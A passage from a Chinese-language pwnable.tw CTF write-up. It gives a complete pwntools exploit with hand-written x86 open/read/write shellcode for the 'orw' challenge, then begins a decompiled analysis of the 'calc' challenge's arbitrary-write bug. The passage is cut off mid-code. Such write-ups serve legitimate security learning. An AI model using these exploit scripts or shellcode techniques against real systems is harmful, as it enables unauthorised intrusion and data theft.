</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br></div></div></details> <p>ps:在这里千万需要注意，<code>exp</code>写入的时候，你接收后的数据发送后不需要回车。也就是<code>sendline()</code>.如果是这样的形式输入会导致你填充的数据多加一个'\n'，导致最后接收的地址出现错误。(被卡死在这里很久，后面调试的时候发现了问题。懊恼！！! T_T).</p> <h2 id="orw"><a href="#orw" class="header-anchor">#</a> Orw</h2> <h4 id="分析-2"><a href="#分析-2" class="header-anchor">#</a> 分析</h4> <p><img src="https://i.loli.net/2021/04/26/Ajwv3z6spPTrHIQ.jpg" alt="main"></p> <p>题目描述了，<code>Only open read write syscall are allowed to use.</code>意味着我们需要在shellcode里面写入这些来调用。读出flag。</p> <p><img src="https://i.loli.net/2021/04/26/DfHrko5NwpEsC31.jpg" alt="check"></p> <p>发现就只开了<code>canary</code>，<code>nx</code>保护没开<code>shellcode</code>想法成立.</p> <p>还是利用系统调用表中的函数进行读写</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>file <span class="token operator">=</span> <span class="token string">'/home/orw/flag'</span><span class="token punctuation">;</span>
    <span class="token function">sys_open</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sys_read</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>file<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sys_write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>file<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>然后转换其汇编即可。</p> <h4 id="exp-2"><a href="#exp-2" class="header-anchor">#</a> exp</h4> <details class="custom-block details"><summary>exp</summary> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 

arch      <span class="token operator">=</span> <span class="token number">32</span>
challenge <span class="token operator">=</span> <span class="token string">&quot;./orw&quot;</span>

slog <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span> <span class="token punctuation">:</span> <span class="token number">111</span><span class="token punctuation">}</span>
local <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">&quot;debug&quot;</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">&quot;linux&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span>challenge<span class="token punctuation">)</span>
    <span class="token comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span>
    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>challenge<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;chall.pwnable.tw&quot;</span><span class="token punctuation">,</span><span class="token number">10001</span><span class="token punctuation">)</span>
    <span class="token comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span>
<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>
p   <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> pause<span class="token punctuation">(</span><span class="token punctuation">)</span> 
s   <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> success<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
re  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
sd  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ia  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token comment"># after a, send b;</span>

<span class="token keyword">def</span> <span class="token function">slog_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> slog<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">' ==&gt; '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>slog<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">makeShellcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
	xor ecx,ecx;
	mov eax,0x5;
	push ecx;
	push 0x67616c66;
	push 0x2f77726f;
	push 0x2f656d6f;
	push 0x682f2f2f;
	mov ebx,esp;
	xor edx,edx;
	int 0x80;

	mov eax,0x3;
	mov ecx,ebx;
	mov ebx,0x3;
	mov dl,0x30;
	int 0x80;

	mov eax,0x4;
	mov bl,0x1;
	int 0x80;
	'''</span>
	shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
	<span class="token keyword">return</span> shellcode

<span class="token triple-quoted-string string">'''
open(file,0,0)写入文件路径存放在寄存器里面，打开文件
read(fd, *buf, 0x30)把存在寄存器的路径写到文件里面.
write(1, buf, 0x30)把flag打印出来.
'''</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#gdb.attach(io)</span>
    shellcode <span class="token operator">=</span> makeShellcode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Give my your shellcode:&quot;</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> re<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> flag


exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br></div></div></details> <h4 id="调试"><a href="#调试" class="header-anchor">#</a> 调试</h4> <p><img src="https://i.loli.net/2021/04/26/nQi3T2R1VYqEc9C.jpg" alt="shellcode_call"></p> <p>进入<code>shellcode</code>，调试一下我们的<code>shellcode</code>是否执行符合人意.</p> <p><img src="https://i.loli.net/2021/04/26/E6ODd3rnwgsZPKF.jpg" alt="open"></p> <p><img src="https://i.loli.net/2021/04/26/yIuioXS8Nb5ROGP.jpg" alt="read"></p> <p><img src="https://i.loli.net/2021/04/26/doXvbwalPWN9eiM.jpg" alt="write"></p> <h2 id="calc"><a href="#calc" class="header-anchor">#</a> calc</h2> <h4 id="分析-3"><a href="#分析-3" class="header-anchor">#</a> 分析</h4> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> number<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-5A0h] BYREF</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1ACh] [ebp-40Ch] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+5ACh] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">bzero</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment">// 将S的前0x400个字节清零</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">get_expr</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                   <span class="token comment">// 过滤输入不为数字或运算符的其他字符</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token function">init_pool</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment">// 初始化数组v1</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">parse_expr</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> number<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;%d\n&quot;</span><span class="token punctuation">,</span> number<span class="token punctuation">[</span>number<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>关键函数就在<code>get_expr()</code>和<code>parse_expr()</code>,通过分析知道<code>get_expr()</code>是过滤除计算符和数字。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">signed</span> <span class="token keyword">int</span> __cdecl <span class="token function">parse_expr</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> _DWORD <span class="token operator">*</span>number<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-88h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-84h]</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-80h]</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+2Ch] [ebp-7Ch]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>s1<span class="token punctuation">;</span> <span class="token comment">// [esp+30h] [ebp-78h]</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+34h] [ebp-74h]</span>
  <span class="token keyword">char</span> Operator<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+38h] [ebp-70h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+9Ch] [ebp-Ch]</span>

  v11 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> a1<span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">bzero</span><span class="token punctuation">(</span>Operator<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token string">'0'</span> <span class="token operator">&gt;</span> <span class="token number">9</span> <span class="token punctuation">)</span>                  <span class="token comment">// 确保数字是在0-9,</span>
    <span class="token punctuation">{</span>
      v7 <span class="token operator">=</span> i <span class="token operator">+</span> a1 <span class="token operator">-</span> v4<span class="token punctuation">;</span>
      s1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">memcpy</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
      s1<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">&quot;0&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                   <span class="token comment">// 输入的第一个字符不能是'0'</span>
      <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;prevent division by zero&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      v9 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>number<span class="token punctuation">)</span><span class="token operator">++</span><span class="token punctuation">;</span>
        number<span class="token punctuation">[</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">9</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;expression error!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      v4 <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> a1<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> Operator<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token keyword">case</span> <span class="token string">'%'</span><span class="token operator">:</span>
          <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token operator">:</span>
          <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token operator">:</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> Operator<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'+'</span> <span class="token operator">&amp;&amp;</span> Operator<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'-'</span> <span class="token punctuation">)</span>
              <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>
            Operator<span class="token punctuation">[</span><span class="token operator">++</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
          <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token operator">:</span>
          <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token operator">:</span>
LABEL_14<span class="token operator">:</span>
            <span class="token function">eval</span><span class="token punctuation">(</span>number<span class="token punctuation">,</span> Operator<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Operator<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
          <span class="token keyword">default</span><span class="token operator">:</span>
            <span class="token function">eval</span><span class="token punctuation">(</span>number<span class="token punctuation">,</span> Operator<span class="token punctuation">[</span>v6<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">{</span>
        Operator<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>                         <span class="token comment">// 当上面输入的不是正规的表达式时也能先存储后检测，也能通过</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token function">eval</span><span class="token punctuation">(</span>number<span class="token punctuation">,</span> Operator<span class="token punctuation">[</span>v6<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// 计算,前面存放数字,后面存放运算符</span>
  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br></div></div><p>开头只有一个check，确保内部的全部是'0-9'的数字,运算符就放入s[]中，只是一开始不能输入0。</p> <p>然后最重要的<code>eval()</code></p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_DWORD <span class="token operator">*</span>__cdecl <span class="token function">eval</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>number<span class="token punctuation">,</span> <span class="token keyword">char</span> Operator<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// eax</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> Operator <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    number<span class="token punctuation">[</span><span class="token operator">*</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> number<span class="token punctuation">[</span><span class="token operator">*</span>number<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//这里的赋值构造了以后的任意地址写</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> Operator <span class="token operator">&gt;</span> <span class="token string">'+'</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> Operator <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
